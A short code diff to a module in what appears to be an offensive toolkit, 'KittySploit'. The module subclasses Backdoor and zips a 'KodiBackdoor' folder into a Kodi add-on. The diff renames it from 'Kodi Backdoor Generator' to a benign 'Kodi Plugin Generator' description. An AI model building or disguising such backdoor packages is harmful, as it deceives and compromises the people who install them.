@@ -4,8 +4,9 @@ import zipfile
 class Module(Backdoor):
 	
 	__info__ = {
-		'name': 'Kodi Backdoor Generator',
-		'description': 'Kodi Backdoor Generator ',
+		'name': 'Kodi Plugin Generator',
+		'description': 'Kodi Plugin Generator for Kodi 19',
+		'author': 'KittySploit Team',
 		'arch': Arch.MISC,
 	}
 
@@ -79,4 +80,3 @@ class Module(Backdoor):
 		self.zipdir('KodiBackdoor', zipf)
 		zipf.close()
 		print_status("Putting everything in ZIP file...")
-		return True
